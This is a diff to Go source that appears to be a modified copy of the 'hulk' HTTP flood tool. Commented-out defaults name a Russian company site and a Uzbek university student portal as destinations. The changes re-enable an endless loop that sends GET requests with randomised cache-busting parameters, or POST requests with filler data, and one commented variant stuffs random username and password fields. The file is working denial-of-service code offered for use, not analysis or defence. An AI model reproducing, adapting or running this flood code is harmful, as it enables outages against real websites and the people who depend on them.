@@ -105,8 +105,8 @@ func main() {
 
 	// flag.StringVar(&site, "site", "https://ru.dsr-corporation.com", "Destination site.")
 	// flag.StringVar(&site, "site", "https://student.adu.uz", "Destination site.")
-	flag.StringVar(&agents, "agents", "", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
-	flag.StringVar(&data, "data", "asddddddddddddddddasdasdasd", "Data to POST. If present hulk will use POST requests instead of GET")
+	flag.StringVar(&agents, "agents", "asdasdasd", "Get the list of user-agent lines from a file. By default the predefined list of useragents used.")
+	flag.StringVar(&data, "data", "", "Data to POST. If present hulk will use POST requests instead of GET")
 	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
 	flag.Parse()
 
@@ -214,25 +214,26 @@ func main() {
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
 	atomic.AddInt32(&cur, 1)
 
-	// var param_joiner string
-	// var client = new(http.Client)
+	var param_joiner string
+	var client = new(http.Client)
 
-	// if strings.ContainsRune(url, '?') {
-	// 	param_joiner = "&"
-	// } else {
-	// 	param_joiner = "?"
-	// }
+	if strings.ContainsRune(url, '?') {
+		param_joiner = "&"
+	} else {
+		param_joiner = "?"
+	}
 
 	for {
 		var q *http.Request
 		var err error
 
 		// if data == "" {
-		// 	q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
-		// 	// q, err = http.NewRequest("GET", url+param_joiner+"username="+buildblock(rand.Intn(7)+3)+"password="+buildblock(rand.Intn(7)+3), nil)
-		// } else {
-		q, err = http.NewRequest("POST", url, strings.NewReader(data))
-		// }
+		if false {
+			q, err = http.NewRequest("GET", url+param_joiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+			// q, err = http.NewRequest("GET", url+param_joiner+"username="+buildblock(rand.Intn(7)+3)+"password="+buildblock(rand.Intn(7)+3), nil)
+		} else {
+			q, err = http.NewRequest("POST", url, strings.NewReader(data))
+		}
 
 		if err != nil {
 			s <- callExitOnErr
